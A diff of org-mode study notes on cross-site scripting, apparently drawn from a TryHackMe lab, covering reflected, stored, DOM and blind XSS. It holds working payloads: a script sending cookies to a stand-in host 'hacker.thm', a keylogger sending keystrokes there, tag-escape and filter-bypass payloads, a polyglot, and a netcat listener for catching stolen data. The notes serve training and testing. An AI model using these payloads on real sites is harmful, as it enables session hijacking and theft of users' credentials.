@@ -1,5 +1,5 @@
 #+TITLE: Cross-Site Scripting
-
+* Intro
 Prerequisites:
 It's worth noting that because XSS is based on JavaScript, it would be helpful to have a basic understanding of the language. However, none of the examples is overly complicated—also, a basic understanding of Client-Server requests and responses.
 
@@ -14,10 +14,9 @@ Cross-site scripting vulnerabilities are extremely common. Below are a few repor
 [[https://hackerone.com/reports/449351][2,500 for XSS in HackerOne]]
 [[https://hackerone.com/reports/283825][XSS found in infogram]]
 
-
 * XSS Payloads
 
- What is a payload?
+** What is a payload?
 
 In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.
 
@@ -28,7 +27,7 @@ The intention is what you wish the JavaScript to actually do (which we'll cover 
 Here are some examples of XSS intentions.
 
 
-Proof Of Concept:
+** Proof Of Concept:
 
 This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:
 
@@ -36,7 +35,7 @@ This is the simplest of payloads where all you want to do is demonstrate that yo
 <script>alert('XSS');</script>
 
 
-Session Stealing:
+** Session Stealing:
 
 Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
 
@@ -44,7 +43,7 @@ Details of a user's session, such as login tokens, are often kept in cookies on 
 <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
 
 
-Key Logger:
+** Key Logger:
 
 The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
 
@@ -52,7 +51,7 @@ The below code acts as a key logger. This means anything you type on the webpage
 <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
 
 
-Business Logic:
+** Business Logic:
 
 This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:
 
@@ -64,7 +63,6 @@ Now that the email address for the account has changed, the attacker may perform
 
 
 The next four tasks are going to cover the different types of XSS Vulnerabilities, all requiring slightly different attack payloads and user interaction.
-
 
 * Reflected XSS
 
@@ -104,7 +102,6 @@ You'll need to test every possible point of entry; these include:
 
 Once you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected (you'll learn more about this in task 6)
   
-
 * Stored XSS
 
   As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.
@@ -129,7 +126,6 @@ You'll need to test every possible point of entry where it seems data is stored 
 
 Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads. 
 Once you've found some data which is being stored in the web application,  you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected (you'll learn more about this in task 6).
-
 
 * DOM Based XSS
 
@@ -182,7 +178,6 @@ When testing for Blind XSS vulnerabilities, you need to ensure your payload has 
 
 A popular tool for Blind XSS attacks is [[https://xsshunter.com/][xsshunter]]. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.
 
-
 * Perfecting your Payload
   
 The payload is the JavaScript code we want to execute either on another user's browser or as a proof of concept to demonstrate a vulnerability in a website.
@@ -197,7 +192,7 @@ The aim for each level will be to execute the JavaScript alert function with the
 
 <script>alert('THM');</script>
 
-Level One:
+** Level One:
 
 You're presented with a form asking you to enter your name, and once you've entered your name, it will be presented on a line below, for example:
 
@@ -212,7 +207,7 @@ Now when you click the enter button, you'll get an alert popup with the string T
 
 And then, you'll get a confirmation message that your payload was successful with a link to the next level.
 
-Level Two:
+** Level Two:
 
 Like the previous level, you're being asked again to enter your name. This time when clicking enter, your name is being reflected in an input tag instead:
 
@@ -231,7 +226,7 @@ This now closes the input tag properly and allows the JavaScript payload to run:
 Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.
 
 
-Level Three:
+** Level Three:
 
 You're presented with another form asking for your name, and the same as the previous level, your name gets reflected inside an HTML tag, this time the textarea tag.
 
@@ -248,7 +243,7 @@ The important part of the above payload is </textarea>, which causes the textare
 
 Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.
 
-Level Four:
+** Level Four:
 
 Entering your name into the form, you'll see it reflected on the page. This level looks similar to level one, but upon inspecting the page source, you'll see your name gets reflected in some JavaScript code.
 
@@ -259,7 +254,7 @@ You'll have to escape the existing JavaScript command, so you're able to run you
 Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.
 
 
-Level Five:
+** Level Five:
 
 Now, this level looks the same as level one, and your name also gets reflected in the same place. But if you try the <script>alert('THM');</script> payload, it won't work. When you view the page source, you'll see why.
 
@@ -298,7 +293,6 @@ An XSS polyglot is a string of text which can escape attributes, tags and bypass
 
 
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
-
 
 * Practical Example (Blind XSS)
   
@@ -355,7 +349,6 @@ nc
 user@machine$ nc -nlvp 9001
 
         
-
 
 Two:
 
